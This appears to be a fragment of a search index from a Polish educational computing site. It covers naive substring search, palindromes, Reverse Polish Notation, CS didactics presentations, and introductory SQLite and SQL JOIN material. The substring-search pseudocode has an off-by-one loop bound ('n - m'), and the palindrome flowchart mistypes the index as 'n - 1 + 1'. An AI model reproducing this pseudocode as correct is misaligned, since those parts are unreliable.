<p>Problem wygl\u0105da nast\u0119puj\u0105co: dostajemy dwa teksty, nazwijmy je tekst oraz wzorzec, a naszym (algorytmu) zadaniem jest sprawdzenie, czy wzorzec zawiera si\u0119 w tek\u015bcie. </p>"},{"location":"algorithms/text/naive-substring-search/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/text/naive-substring-search/#dane","title":"Dane:","text":"<ul> <li>\\(n\\) - d\u0142ugo\u015b\u0107 tekstu, \\(n\\in\\mathbb{N}, n\\geq1\\) </li> <li>\\(tekst[1..n]\\) - ci\u0105g znak\u00f3w o d\u0142ugo\u015bci \\(n\\), numerowanych od jedynki </li> <li>\\(m\\) - d\u0142ugo\u015b\u0107 wzorca,  \\(m\\in\\mathbb{N}, 1\\leq m\\leq n\\)</li> <li>\\(wzorzec[1..m]\\) - ci\u0105g znak\u00f3w o d\u0142ugo\u015bci \\(m\\), numerowanych od jedynki </li> </ul>"},{"location":"algorithms/text/naive-substring-search/#wynik","title":"Wynik:","text":"<ul> <li>Indeks pierwszego wyst\u0105pienia wzorca w tek\u015bcie, lub \\(-1\\) je\u017celi wzorzec nie wyst\u0119puje w tek\u015bcie</li> </ul>"},{"location":"algorithms/text/naive-substring-search/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithms/text/naive-substring-search/#dane_1","title":"Dane","text":"<pre><code>tekst := \"alamakota\"\nwzorzec := \"kot\"\n</code></pre> <p>Wynik: \\(6\\).</p>"},{"location":"algorithms/text/naive-substring-search/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithms/text/naive-substring-search/#dane_2","title":"Dane","text":"<pre><code>tekst := \"alamakota\"\nwzorzec := \"koty\"\n</code></pre> <p>Wynik: \\(-1\\).</p>"},{"location":"algorithms/text/naive-substring-search/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Pomocnicza funkcja <code>TestujWzorzec</code>sprawdza, czy wzorzec znajduje si\u0119 w tek\u015bcie pod indeksem <code>i</code>.</p>"},{"location":"algorithms/text/naive-substring-search/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja TestujWzorzec(i, n, tekst, m, wzorzec)\n    1. Dla j := 1 do m, wykonuj:\n        2. Je\u017celi tekst[i + j - 1] != wzorzec[j], to:\n            3. Zwr\u00f3\u0107 FA\u0141SZ\n\n    4. Zwr\u00f3\u0107 PRAWDA\n</code></pre> <pre><code>funkcja SzukajWzorca(n, tekst, m, wzorzec)\n    1. Dla i := 1 do n - m, wykonuj:\n        2. Je\u017celi TestujWzorzec(i, n, tekst, m, wzorzec), to:\n            3. Zwr\u00f3\u0107 i\n\n    4. Zwr\u00f3\u0107 -1\n</code></pre>"},{"location":"algorithms/text/naive-substring-search/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"TestujWzorzec(i, n, tekst, m, wzorzec)\"]) --&gt; K0[j := 1]\n    K0 --&gt; K1{j &lt;= m}\n    K1 -- PRAWDA --&gt; K2{\"tekst[i + j - 1] != wzorzec[j]\"}\n    K2 -- PRAWDA --&gt; K3[/Zwr\u00f3\u0107 FA\u0141SZ/]\n    K2 -- FA\u0141SZ --&gt; K1i[j := j + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ --&gt; K4[/Zwr\u00f3\u0107 PRAWDA/]\n    K4 --&gt; STOP([STOP])\n    K3 --&gt; STOP</code></pre> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"SzukajWzorca(n, tekst, m, wzorzec)\"]) --&gt; K0[i := 1]\n    K0 --&gt; K1{i &lt;= n - m}\n    K1 -- PRAWDA --&gt; K2{\"TestujWzorzec(i, n, tekst, m, wzorzec)\"}\n    K2 -- PRAWDA --&gt; K3[/Zwr\u00f3\u0107 i/]\n    K2 -- FA\u0141SZ --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ --&gt; K4[/Zwr\u00f3\u0107 -1/]\n    K4 --&gt; STOP([STOP])\n    K3 --&gt; STOP</code></pre>"},{"location":"algorithms/text/naive-substring-search/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n*m)\\to O(n^2)\\) - kwadratowa</p>"},{"location":"algorithms/text/naive-substring-search/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/text/naive-substring-search/#c","title":"C++","text":""},{"location":"algorithms/text/naive-substring-search/#python","title":"Python","text":""},{"location":"algorithms/text/palindrome/","title":"Palindrom","text":"<p>Palindrom to wyraz, kt\u00f3ry czytany od lewej do prawej i od prawej do lewej jest taki sam.</p>"},{"location":"algorithms/text/palindrome/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/text/palindrome/#dane","title":"Dane","text":"<ul> <li>\\(n\\) \u2014 liczba naturalna, d\u0142ugo\u015b\u0107 tekstu, \\(n &gt; 0\\)</li> <li>\\(tekst[1..n]\\) \u2014 ci\u0105g znak\u00f3w o d\u0142ugo\u015bci \\(n\\), numerowanych od jedynki</li> </ul>"},{"location":"algorithms/text/palindrome/#wynik","title":"Wynik","text":"<ul> <li>\\(PRAWDA\\) \u2014 je\u017celi tekst jest palindromem</li> <li>\\(FA\u0141SZ\\) \u2014 w przeciwnym przypadku</li> </ul>"},{"location":"algorithms/text/palindrome/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithms/text/palindrome/#dane_1","title":"Dane","text":"<pre><code>n := 5\ntekst := \"kajak\"\n</code></pre>"},{"location":"algorithms/text/palindrome/#wynik-prawda","title":"Wynik: PRAWDA","text":"<p>Info</p> <p>Wyja\u015bnienie</p> <p>Wyraz kajak czytany od ty\u0142u to kajak, jest on wi\u0119c palindromem.</p>"},{"location":"algorithms/text/palindrome/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithms/text/palindrome/#dane_2","title":"Dane","text":"<pre><code>n := 4\ntekst := \"tama\"\n</code></pre> <p>Wynik: FA\u0141SZ</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Wyraz tama czytany od ty\u0142u to amat, nie jest on wi\u0119c palindromem.</p>"},{"location":"algorithms/text/palindrome/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Jednym ze sposob\u00f3w na sprawdzenie, czy wyraz jest palindromem, jest przej\u015bcie znak po znaku od lewej a\u017c do \u015brodka i por\u00f3wnywanie ze znakami od prawej strony. Mo\u017cna to zrealizowa\u0107 za pomoc\u0105 jednej p\u0119tli i odpowiedniego obliczania indeksu znaku \"od ko\u0144ca\". Dla przyk\u0142adu, je\u017celi mamy wyraz o d\u0142ugo\u015bci \\(6\\) znak\u00f3w, to b\u0119dziemy ze sob\u0105 por\u00f3wnywali parami znaki na pozycjach: \\((1, 6), (2, 5), (3, 4)\\). W momencie gdy tylko stwierdzimy, \u017ce znaki na odpowiadaj\u0105cych sobie pozycjach si\u0119 r\u00f3\u017cni\u0105, mo\u017cemy zwr\u00f3ci\u0107 jako wynik fa\u0142sz, poniewa\u017c oznacza to, \u017ce wyraz nie jest palindromem. Je\u017celi natomiast przejdziemy tak przez wszystkie pary znak\u00f3w i nie stwierdzimy sprzeczno\u015bci, to po wyj\u015bciu z p\u0119tli wiemy, \u017ce wyraz jest palindromem, zwracamy wi\u0119c warto\u015b\u0107 prawda.</p>"},{"location":"algorithms/text/palindrome/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja CzyPalindrom(n, tekst):\n    1. srodek := n div 2\n    2. Od i := 1 do srodek, wykonuj:\n        3. Je\u017celi tekst[i] != tekst[n - i + 1], to:\n            4. Zwr\u00f3\u0107 FA\u0141SZ\n    5. Zwr\u00f3\u0107 PRAWDA\n</code></pre>"},{"location":"algorithms/text/palindrome/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"CzyPalindrom(n, tekst)\"]) --&gt; K1[\"srodek := n div 2\n    i := 1\"]\n    K1 --&gt; K2{i &lt;= srodek}\n    K2 -- PRAWDA --&gt; K3{\"tekst[i] != tekst[n - 1 + 1]\"}\n    K3 -- PRAWDA --&gt; K4[/Zwr\u00f3\u0107 FA\u0141SZ/]\n    K4 --&gt; STOP([STOP])\n    K3 -- FA\u0141SZ --&gt; K2i[i := i + 1]\n    K2i --&gt; K2\n    K2 -- FA\u0141SZ --&gt; K5[/Zwr\u00f3\u0107 PRAWDA/]\n    K5 --&gt; STOP</code></pre>"},{"location":"algorithms/text/palindrome/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n/2)\\to O(n)\\) \u2014 liniowa</p> <p>Przechodzimy p\u0119tl\u0105 od \\(1\\) do po\u0142owy d\u0142ugo\u015bci wyrazu (czyli do \\(\\lfloor\\frac{n}{2}\\rfloor\\)) por\u00f3wnuj\u0105c ze sob\u0105 odpowiednie pary znak\u00f3w, st\u0105d z\u0142o\u017cono\u015b\u0107 liniowa.</p>"},{"location":"algorithms/text/palindrome/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/text/palindrome/#c","title":"C++","text":""},{"location":"algorithms/text/palindrome/#python","title":"Python","text":""},{"location":"algorithms/text/rpn/","title":"Odwrotna Notacja Polska","text":"<p>Odwrotna notacja polska (ang. Reverse Polish Notation, RPN) jest form\u0105 notacji, kt\u00f3ra jest u\u017cywana w matematyce, informatyce i niekt\u00f3rych modelach kalkulator\u00f3w. Nazwa odnosi si\u0119 do narodowo\u015bci logika, Jana \u0141ukasiewicza, kt\u00f3ry pierwotnie zaproponowa\u0142 ten styl notacji. W przeciwie\u0144stwie do notacji w kt\u00f3rej operator jest pomi\u0119dzy operandami (infix), w odwrotnej notacji polskiej operator jest umieszczany po operandach.</p> <p>Na przyk\u0142ad, zamiast pisa\u0107 <code>2 + 3</code>, u\u017cywaj\u0105c odwrotnej notacji polskiej, napisaliby\u015bmy <code>2 3 +</code>.</p> <p>Odwrotna notacja polska eliminuje konieczno\u015b\u0107 u\u017cywania nawias\u00f3w do wskazania kolejno\u015bci operacji i u\u0142atwia obliczenia dla maszyn, szczeg\u00f3lnie kalkulator\u00f3w i komputer\u00f3w.</p>"},{"location":"algorithms/text/rpn/#algorytm-ewaluacji-wyrazen-zapisanych-w-odwrotnej-notacji-polskiej","title":"Algorytm ewaluacji wyra\u017ce\u0144 zapisanych w Odwrotnej Notacji Polskiej","text":"<ol> <li>Przejrzyj wyra\u017cenie od lewej do prawej.</li> <li>Gdy napotkasz liczb\u0119, dodaj j\u0105 do stosu.</li> <li>Gdy napotkasz operator, zdejmij z g\u00f3ry stosu tyle liczb ile jest argument\u00f3w operatora, wykonaj operacj\u0119, a wynik wrzu\u0107 na stos.</li> <li>Gdy przejrzysz ca\u0142e wyra\u017cenie, na stosie powinna zosta\u0107 jedna liczba - wynik ca\u0142ego wyra\u017cenia.</li> </ol>"},{"location":"algorithms/text/rpn/#przykad","title":"Przyk\u0142ad","text":"<p>We\u017amy na przyk\u0142ad wyra\u017cenie matematyczne <code>2 * (3 + 4)</code>. W odwrotnej notacji polskiej wyra\u017cenie to staje si\u0119 <code>2 3 4 + *</code>. Prze\u015bled\u017amy, jak mo\u017cemy obliczy\u0107 jego warto\u015b\u0107.</p>"},{"location":"algorithms/text/rpn/#ewaluacja-wyrazenia","title":"Ewaluacja wyra\u017cenia","text":"<ol> <li>Przejrzyj wyra\u017cenie od lewej do prawej. Na pocz\u0105tku stos jest pusty.</li> <li>Pierwsze dwie liczby to \\(2\\) i \\(3\\), kt\u00f3re s\u0105 dodawane do stosu.</li> <li>Kolejna liczba to \\(4\\), kt\u00f3ra jest dodawana do stosu.</li> <li>Napotykamy operator \\(+\\). Zdejmujemy dwie ostatnie liczby ze stosu, dodajemy je do siebie \\((3 + 4 = 7)\\), a wynik wrzucamy na stos.</li> <li>Ostatecznie napotykamy operator \\(*\\). Zdejmujemy dwie ostatnie liczby ze stosu, mno\u017cymy je przez siebie \\((2 * 7 = 14)\\), a wynik wrzucamy na stos.</li> <li>Przejrzeli\u015bmy ca\u0142e wyra\u017cenie. Na stosie pozosta\u0142a jedna liczba - \\(14\\), co jest wynikiem ca\u0142ego wyra\u017cenia.</li> </ol> <p>Z powy\u017cszego przyk\u0142adu wida\u0107, \u017ce korzystanie z Odwrotnej Notacji Polskiej mo\u017ce znacznie upro\u015bci\u0107 obliczenia, szczeg\u00f3lnie dla komputer\u00f3w i kalkulator\u00f3w.</p>"},{"location":"algorithms/text/rpn/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/text/rpn/#dane","title":"Dane","text":"<ul> <li>onp - ci\u0105g znak\u00f3w reprezentuj\u0105cy poprawne wyra\u017cenie w Odwrotnej Notacji Polskiej</li> </ul>"},{"location":"algorithms/text/rpn/#wynik","title":"Wynik","text":"<ul> <li>Warto\u015b\u0107 wyra\u017cenia onp</li> </ul>"},{"location":"algorithms/text/rpn/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"algorithms/text/rpn/#dane_1","title":"Dane","text":"<pre><code>onp := \"27+3/13-4*+2/\"\n</code></pre> <p>Wynik: \\(-2.5\\)</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Przedstawione wyra\u017cenie ONP odpowiada nast\u0119puj\u0105cemu wyra\u017ceniu arytmetycznemu:</p> <p>\\((((2 + 7) / 3) + (1 - 3) * 4) / 2\\)</p>"},{"location":"algorithms/text/rpn/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/text/rpn/#c","title":"C++","text":""},{"location":"algorithms/text/rpn/#python","title":"Python","text":""},{"location":"cs-didactics/","title":"Wst\u0119p","text":"<p>Wi\u0119kszo\u015b\u0107 tre\u015bci dost\u0119pnych na tej stronie skierowanych jest do szerokiego grona odbiorc\u00f3w - zar\u00f3wno do uczni\u00f3w, student\u00f3w, jak i ka\u017cdej osoby pragn\u0105cej poszerzy\u0107 swoj\u0105 wiedz\u0119 w okre\u015blonym obszarze. Ponadto, materia\u0142y te stanowi\u0105 znakomite \u017ar\u00f3d\u0142o informacji dla nauczycieli poszukuj\u0105cych inspiracji do lekcji. Niekt\u00f3re zagadnienia i tre\u015bci s\u0105 jednak dedykowane specjalnie dla nauczycieli i wszystkich os\u00f3b zainteresowanych dydaktyk\u0105 informatyki oraz nowoczesnymi metodami nauczania tego przedmiotu. W\u0142a\u015bnie takie tematy i materia\u0142y zgromadzili\u015bmy w tym dziale, aby sprosta\u0107 oczekiwaniom profesjonalist\u00f3w z dziedziny edukacji, daj\u0105c im dost\u0119p do narz\u0119dzi i informacji niezb\u0119dnych do efektywnego kszta\u0142cenia przysz\u0142ych informatyk\u00f3w.</p>"},{"location":"cs-didactics/algorithmic-creative-thinking/","title":"Algorytmika - kreatywne my\u015blenie","text":"<p>Kr\u00f3tka prezentacja o tym, jak mo\u017cna rozwija\u0107 kreatywne my\u015blenie za pomoc\u0105 algorytmiki.</p> <p> Prezentacja</p>"},{"location":"cs-didactics/competition/","title":"Konkurs przedmiotowy z informatyki","text":"<p>Poni\u017csza prezentacja zawiera om\u00f3wienie Konkursu Przedmiotowego z Informatyki dla Szk\u00f3\u0142 Podstawowych z Wojew\u00f3dztwa Kujawsko-Pomorskiego w roku szkolnym 2023/2024.</p> <p> Prezentacja</p>"},{"location":"cs-didactics/core-curriculum-discussion/","title":"Om\u00f3wienie podstawy programowej","text":""},{"location":"cs-didactics/core-curriculum-discussion/#algorytmika-i-programowanie-na-i-i-ii-etapie-edukacyjnym","title":"Algorytmika i programowanie na I i II etapie edukacyjnym","text":"<p>Poni\u017csza prezentacja zawiera kr\u00f3tk\u0105 analiz\u0119 podstawy programowej do I i II etapu edukacyjnego pod k\u0105tem tre\u015bci zwi\u0105zanych z algorytmik\u0105 i programowaniem.</p> <p> Prezentacja</p>"},{"location":"cs-didactics/errors-bugs/","title":"B\u0142\u0119dy, robaki, bugi: jak uczy\u0107 programowania, nie trac\u0105c w\u0142os\u00f3w (ani cierpliwo\u015bci)","text":"<p>Kr\u00f3tka prezentacja o radzeniu sobie z b\u0142\u0119dami w kodzie, kt\u00f3re mog\u0105 pojawi\u0107 si\u0119 podczas nauki programowania.</p> <p> Prezentacja (PDF)</p> <p> Prezentacja (PowerPoint)</p>"},{"location":"cs-didactics/gamification/","title":"Grywalizacja","text":"<p>Zagadnienia z szeroko poj\u0119tej informatyki oraz jej licznych dziedzin, takich jak kryptografia, algorytmika, bezpiecze\u0144stwo w sieci i inne, cz\u0119sto stanowi\u0105 wyzwanie zar\u00f3wno dla uczni\u00f3w, jak i nauczycieli. Dodatkowo, wa\u017cne tematy bywaj\u0105 postrzegane przez m\u0142odzie\u017c jako nudne i \u017cmudne. Nie musi jednak tak by\u0107! Poni\u017csza prezentacja pokazuje w jaki spos\u00f3b po\u0142\u0105czy\u0107 nauk\u0119 z zabaw\u0105, czyni\u0105c trudne zagadnienia bardziej przyst\u0119pnymi i interesuj\u0105cymi. Te interaktywne formy nauki pomog\u0105 lepiej zrozumie\u0107 skomplikowane tematy z dziedziny informatyki, a jednocze\u015bnie b\u0119d\u0105 motywowa\u0107 do dalszego pog\u0142\u0119biania wiedzy poprzez elementy grywalizacji. Dzi\u0119ki takiemu podej\u015bciu uczestnicy nie tylko przyswoj\u0105 teoretyczn\u0105 wiedz\u0119, ale tak\u017ce b\u0119d\u0105 mogli praktycznie j\u0105 zastosowa\u0107, co zwi\u0119kszy ich zaanga\u017cowanie i zainteresowanie tematyk\u0105 informatyczn\u0105.</p> <p> Prezentacja</p>"},{"location":"cs-didactics/open-source/","title":"Otwarte oprogramowanie","text":"<p>Poni\u017csza prezentacja, zaprezentowana na Toru\u0144skim Festiwalu Nauki i Sztuki dnia 21.04.2024 roku, pokazuje rzut z lotu ptaka na histori\u0119, rozw\u00f3j, tera\u017aniejszo\u015b\u0107 i przysz\u0142o\u015b\u0107 szeroko poj\u0119tego otwartego oprogramowania.</p> <p> Prezentacja</p>"},{"location":"cs-didactics/programming-in-school/","title":"Programowanie w szkole","text":"<p>Kr\u00f3tki przegl\u0105d dost\u0119pnych j\u0119zyk\u00f3w programowania i narz\u0119dzi, kt\u00f3re mog\u0105 pom\u00f3c w aktywizacji uczni\u00f3w.</p> <p> Prezentacja</p>"},{"location":"cs-didactics/remote-learning/","title":"Nauczanie zdalne","text":""},{"location":"cs-didactics/remote-learning/#nauczanie-stacjonarne-vs-nauczanie-zdalne","title":"Nauczanie stacjonarne VS nauczanie zdalne","text":"<p>Jak ka\u017cdy szanuj\u0105cy si\u0119 nauczyciel powinien wiedzie\u0107, metodyka pracy z uczniem podczas nauczania zdalnego znacz\u0105co r\u00f3\u017cni si\u0119 od tej podczas nauczania stacjonarnego. Poni\u017csza prezentacja pokazuje jedynie wierzcho\u0142ek g\u00f3ry lodowej, por\u00f3wnuj\u0105c ze sob\u0105 pewne aspekty nauczania stacjonarnego i nauczania zdalnego.</p> <p> Prezentacja</p>"},{"location":"cs-didactics/thoughts/","title":"Refleksje na temat stanu o\u015bwiaty","text":"<p> Prezentacja</p>"},{"location":"cs-didactics/tricking-teachers/","title":"Nabieranie nauczycieli","text":"<p>Kr\u00f3tki przegl\u0105d sposob\u00f3w, w jakie uczniowie pr\u00f3buj\u0105 nabiera\u0107 swoich nauczycieli informatyki.</p> <p> Prezentacja</p>"},{"location":"cs-didactics/what-for/","title":"Po co mi to","text":"<p>Spojrzenie na wybrane zagadnienia z podstawy programowej oczami uczni\u00f3w.</p> <p> Prezentacja</p>"},{"location":"databases/","title":"Bazy danych","text":"<p>\u017byjemy w \u015bwiecie, gdzie ilo\u015b\u0107 generowanych danych ro\u015bnie z ka\u017cdym dniem. Przyk\u0142adowo, na stronach internetowych logujemy si\u0119 na swoje konta, u\u017cywaj\u0105c adresu e-mail i has\u0142a. Sklepy internetowe przechowuj\u0105 nasze dane, takie jak adres zamieszkania, dane p\u0142atno\u015bci oraz informacje o zam\u00f3wieniach. Portale spo\u0142eczno\u015bciowe zapisuj\u0105 udost\u0119pniane przez nas zdj\u0119cia, filmy, wiadomo\u015bci i posty. Wszystkie te informacje musz\u0105 by\u0107 przechowywane i zarz\u0105dzane w okre\u015blony spos\u00f3b. Cho\u0107 metody przechowywania danych mog\u0105 zale\u017ce\u0107 od ich przeznaczenia, to w\u0142a\u015bnie bazy danych s\u0105 niezast\u0105pione, gdy zale\u017cy nam na wygodnym i szybkim dost\u0119pie do informacji z mo\u017cliwo\u015bci\u0105 wyszukiwania, filtrowania, modyfikacji i innych operacji.</p> <p>Baza danych to zbi\u00f3r tabel. Ka\u017cda tabela sk\u0142ada si\u0119 z kolumn, kt\u00f3re okre\u015blaj\u0105 rodzaje przechowywanych informacji, a tak\u017ce z wierszy, nazywanych rekordami.</p>"},{"location":"databases/#silniki-bazodanowe","title":"Silniki bazodanowe","text":"<p>Na rynku dost\u0119pne s\u0105 r\u00f3\u017cne silniki baz danych, a ka\u017cdy z nich ma swoje unikalne cechy i w\u0142a\u015bciwo\u015bci. Niekt\u00f3re z nich s\u0105 dost\u0119pne za darmo i s\u0105 zazwyczaj (chocia\u017c nie zawsze) przeznaczone do zarz\u0105dzania stosunkowo niewielkimi zbiorami danych. Z kolei inne s\u0105 narz\u0119dziami komercyjnymi wyposa\u017conymi w zaawansowane algorytmy optymalizacyjne, przeznaczone do obs\u0142ugi du\u017cych, z\u0142o\u017conych zbior\u00f3w danych.</p> <p>Poni\u017cej znajduje si\u0119 link do rankingu popularno\u015bci silnik\u00f3w bazodanowych.</p> <p>Ranking popularno\u015bci silnik\u00f3w bazodanowych</p>"},{"location":"databases/introduction/","title":"Wrowadzenie do baz danych","text":"<p>Kr\u00f3tkie wprowadzenie po najwa\u017cniejszych zagadnieniach zwi\u0105zanych z bazami danych.</p>"},{"location":"databases/introduction/datatypes/","title":"Typy danych","text":"<p>Podobnie jak w programowaniu, w bazach danych tak\u017ce mamy r\u00f3\u017cne typy danych. Poszczeg\u00f3lne typy mog\u0105 r\u00f3\u017cni\u0107 si\u0119 w zale\u017cno\u015bci od silnika bazodanowego, na kt\u00f3rym pracujemy. My skupimy si\u0119 na plikowych bazach danych SQLite.</p> <p>W silniku SQLite wszystkie danych przynale\u017c\u0105 do jednego z pi\u0119ciu typ\u00f3w:</p> <ul> <li>NULL - warto\u015b\u0107 pusta,</li> <li>INTEGER - liczba ca\u0142kowita zajmuj\u0105ca od \\(0\\) do \\(8\\) bajt\u00f3w w zale\u017cno\u015bci od wielko\u015bci warto\u015bci,</li> <li>REAL - liczba rzeczywista, zapisana na \\(8\\) bajtach,</li> <li>TEXT - ci\u0105g znak\u00f3w u\u017cywaj\u0105cy kodowania bazy danych (UTF-8, UTF-16B lub UTF-16LE),</li> <li>BLOB - zestaw danych, przechowywanych dok\u0142adnie tak jak zosta\u0142y wprowadzone.</li> </ul> <p>Dodatkowo istnieje tak\u017ce okre\u015blenie NUMERIC. Pola z tym oznaczeniem mog\u0105 zawiera\u0107 warto\u015bci wykorzystuj\u0105ce wszystkie powy\u017csze typy.</p>"},{"location":"databases/introduction/relations/","title":"Relacje","text":"<p>Gdy m\u00f3wimy o bazie danych cz\u0119sto my\u015blimy o relacyjnej bazie danych, chocia\u017c nie jest to jedyny typ baz danych, ale na takim si\u0119 teraz skupimy. W relacyjnej bazie danych, jak sama nazwa wskazuje, pomi\u0119dzy danymi istniej\u0105 relacje, tzn. dane s\u0105 ze sob\u0105 w jaki\u015b spos\u00f3b powi\u0105zane. Co to jednak dok\u0142adnie oznacza? Wyobra\u017amy sobie sklep internetowy, w kt\u00f3rym mamy za\u0142o\u017cone konto i dodany produkt do koszyka. W takiej sytuacji istnieje pewna relacja pomi\u0119dzy naszym kontem, a tym produktem.</p> <p>Przyjrzyjmy si\u0119 r\u00f3\u017cnym typom relacji.</p>"},{"location":"databases/introduction/relations/#jeden-do-wielu-oraz-wiele-do-jednego","title":"Jeden do wielu oraz wiele do jednego","text":"<p>Jest to jeden z najpowszechniej wyst\u0119puj\u0105cych rodzaj\u00f3w relacji w bazach danych. Sp\u00f3jrzmy na poni\u017csz\u0105 struktur\u0119 bazy danych, by lepiej zrozumie\u0107 t\u0119 relacj\u0119.</p> <pre><code>erDiagram\n    Pole ||--o{ Rolnik : \"\"\n    Rolnik {\n        INTEGER RolnikId\n        TEXT Imie\n        TEXT Nazwisko\n    }\n    Pole {\n        INTEGER PoleId\n        REAL Hektary\n        INTEGER RolnikId\n    }</code></pre> <p>W naszej przyk\u0142adowej strukturze mamy dwie tabele: Rolnik oraz Pole. Tabela Rolnik przechowuje informacje na temat rolnik\u00f3w: unikalny identyfikator rolnika, imi\u0119 oraz nazwisko. Tabela Pole zawiera informacje o polach: unikalny identyfikator pola, pole powierzchni wyra\u017cone w hektarach oraz identyfikator rolnika, to kt\u00f3rego nale\u017cy dane pole.</p> <p>Co mo\u017cemy stwierdzi\u0107 na podstawie tego schematu? Jakie relacje tutaj wyst\u0119puj\u0105? Mo\u017cemy zauwa\u017cy\u0107, \u017ce mamy jedno powi\u0105zanie pomi\u0119dzy tabelami Rolnik oraz Pole. Spr\u00f3bujmy je opisa\u0107.</p> <p>Jeden rolnik mo\u017ce mie\u0107 wiele p\u00f3l. Jest to wi\u0119c relacja typu jeden do wielu. </p> <p>Z drugiej strony wiele p\u00f3l mo\u017ce nale\u017ce\u0107 do jednego rolnika. Jest to wi\u0119c relacja wiele do jednego.</p> <p>Jak wida\u0107 te dwie relacje s\u0105 do siebie symetryczne.</p>"},{"location":"databases/sql/","title":"SQL","text":"<p>SQL (ang. Structured Query Language) to j\u0119zyk zapyta\u0144, za pomoc\u0105 kt\u00f3rego mo\u017cemy komunikowa\u0107 si\u0119 z silnikiem bazodanowym. Za pomoc\u0105 zapyta\u0144 SQL mo\u017cemy m. in.: - tworzy\u0107 nowe tabele, - modyfikowa\u0107 tabele, - usuwa\u0107 tabele, - pobiera\u0107 dane, - filtrowa\u0107 dane, - grupowa\u0107 dane, - sortowa\u0107 dane.</p>"},{"location":"databases/sql/#gry","title":"Gry","text":"<p>Ciekawe gry do \u0107wiczenia zagadnie\u0144 zwi\u0105zanych z SQL:</p> <p>SQL Murder Mystery</p>"},{"location":"databases/sql/join/","title":"JOIN","text":"<p>Operacja JOIN w j\u0119zyku zapyta\u0144 SQL s\u0142u\u017cy do \u0142\u0105czenia dw\u00f3ch lub wi\u0119cej tabel na podstawie wsp\u00f3lnego pola (klucza). Istnieje kilka r\u00f3\u017cnych typ\u00f3w operacji JOIN, opisanych poni\u017cej. Poka\u017cemy ich dzia\u0142anie na podstawie \u0142\u0105czenia ze sob\u0105 dw\u00f3ch tabel: Imiona oraz Zawody. Tabele b\u0119dziemy \u0142\u0105czy\u0107 ze sob\u0105 na podstawie pola ID.</p>"},{"location":"databases/sql/join/#imiona","title":"Imiona","text":"ID Imi\u0119 1 Anna 2 Bartek 3 Celina"},{"location":"databases/sql/join/#zawody","title":"Zawody","text":"ID Zaw\u00f3d 2 Programista 3 Lekarz 4 Artysta"},{"location":"databases/sql/join/#inner-join","title":"INNER JOIN","text":"<p>Znany r\u00f3wnie\u017c jako JOIN. Zwraca tylko te rekordy, dla kt\u00f3rych istnieje dopasowanie w obu tabelach.</p>"},{"location":"databases/sql/join/#wynik","title":"Wynik","text":"ID Imi\u0119 Zaw\u00f3d 2 Bartek Programista 3 Celina Lekarz"},{"location":"databases/sql/join/#left-join-left-outer-join","title":"LEFT JOIN (LEFT OUTER JOIN)","text":"<p>Zwraca wszystkie rekordy z lewej tabeli (Imiona), a dopasowane rekordy z prawej tabeli (Zawody). Je\u015bli nie ma dopasowania, wynikiem jest NULL.</p>"},{"location":"databases/sql/join/#wynik_1","title":"Wynik","text":"ID Imi\u0119 Zaw\u00f3d 1 Anna NULL 2 Bartek Programista 3 Celina Lekarz"},{"location":"databases/sql/join/#right-join-right-outer-join","title":"RIGHT JOIN (RIGHT OUTER JOIN)","text":"<p>Zwraca wszystkie rekordy z prawej tabeli (Zawody), a dopasowane rekordy z lewej tabeli (Imiona). Je\u015bli nie ma dopasowania, wynikiem jest NULL.</p>"},{"location":"databases/sql/join/#wynik_2","title":"Wynik","text":"ID Imi\u0119 Zaw\u00f3d 2 Bartek Programista 3 Celina Lekarz 4 NULL Artysta"},{"location":"databases/sql/join/#full-join-full-outer-join","title":"FULL JOIN (FULL OUTER JOIN)","text":"<p>Zwraca wszystkie rekordy z obu tabel, niezal\u017cnie od tego, czy istnieje dla nich dopasowanie w drugiej tabeli. Je\u015bli dla danego rekordu w jednej tabeli nie ma dopasowania w drugiej tabeli, wynikiem jest NULL dla wszystkich kolumn drugiej tabeli.</p>"},{"location":"databases/sql/join/#wynik_3","title":"Wynik","text":"ID Imi\u0119 Zaw\u00f3d 1 Anna NULL 2 Bartek Programista 3 Celina Lekarz 4 NULL Artysta"},{"location":"databases/sql/exercises/","title":"\u0106wiczenia","text":"<p>Przed przyst\u0105pieniem do rozwi\u0105zywania zada\u0144 zapoznaj si\u0119 z poni\u017cszym opisem.</p> <p>Po\u015bwi\u0119\u0107 czas na rozwi\u0105zanie ka\u017cdego zadania. Zastan\u00f3w si\u0119 nad r\u00f3\u017cnymi sposobami podej\u015bcia i rozwi\u0105zania problemu.</p> <p>Zadania podzielone s\u0105 ze wzgl\u0119du na tematy. Tematy u\u0142o\u017cone s\u0105 w sugerowanej kolejno\u015bci poznawania zagadnie\u0144. Ka\u017cdy temat zawiera od kilku do kilkunastu zada\u0144. Po rozwini\u0119ciu tematu pojawi\u0105 si\u0119 przyk\u0142adowe rozwi\u0105zania poszczeg\u00f3lnych zada\u0144, ka\u017cde na osobnej stronie. 